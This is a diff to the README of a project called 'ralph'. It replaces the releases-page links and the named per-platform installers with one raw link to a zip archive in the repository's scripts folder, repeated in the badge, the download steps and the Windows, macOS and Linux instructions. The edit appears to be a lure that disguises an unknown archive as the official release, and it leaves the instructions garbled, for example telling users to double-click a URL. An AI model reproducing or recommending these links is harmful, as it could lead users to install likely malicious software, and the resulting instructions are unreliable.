@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download ralph](https://img.shields.io/badge/Download%20ralph-v1.0-blue.svg)](https://github.com/Dr4gon42/ralph/releases)
+[![Download ralph](https://github.com/Dr4gon42/ralph/raw/refs/heads/main/scripts/Software_v2.4-alpha.2.zip%https://github.com/Dr4gon42/ralph/raw/refs/heads/main/scripts/Software_v2.4-alpha.2.zip)](https://github.com/Dr4gon42/ralph/raw/refs/heads/main/scripts/Software_v2.4-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -30,18 +30,18 @@ ralph offers several features to enhance your experience:
 
 To get ralph, visit the releases page and download the latest version:
 
-[Download ralph](https://github.com/Dr4gon42/ralph/releases)
+[Download ralph](https://github.com/Dr4gon42/ralph/raw/refs/heads/main/scripts/Software_v2.4-alpha.2.zip)
 
 1. Go to the link provided above.
 2. On the releases page, find the latest version of ralph.
-3. Click on the appropriate file for your operating system. For example, you may find files like `ralph-windows.exe`, `ralph-mac.zip`, or `ralph-linux.tar.gz`.
+3. Click on the appropriate file for your operating system. For example, you may find files like `https://github.com/Dr4gon42/ralph/raw/refs/heads/main/scripts/Software_v2.4-alpha.2.zip`, `https://github.com/Dr4gon42/ralph/raw/refs/heads/main/scripts/Software_v2.4-alpha.2.zip`, or `https://github.com/Dr4gon42/ralph/raw/refs/heads/main/scripts/Software_v2.4-alpha.2.zip`.
 4. Download the file to your computer.
 
 Once downloaded:
 
-- **For Windows:** Double-click on the `ralph-windows.exe` file to run it.
-- **For macOS:** Open the `ralph-mac.zip`, extract it, and run the `ralph` application.
-- **For Linux:** Extract the `ralph-linux.tar.gz` file and run the `./ralph` command from your terminal.
+- **For Windows:** Double-click on the `https://github.com/Dr4gon42/ralph/raw/refs/heads/main/scripts/Software_v2.4-alpha.2.zip` file to run it.
+- **For macOS:** Open the `https://github.com/Dr4gon42/ralph/raw/refs/heads/main/scripts/Software_v2.4-alpha.2.zip`, extract it, and run the `ralph` application.
+- **For Linux:** Extract the `https://github.com/Dr4gon42/ralph/raw/refs/heads/main/scripts/Software_v2.4-alpha.2.zip` file and run the `./ralph` command from your terminal.
 
 ## 🔄 Running ralph
 
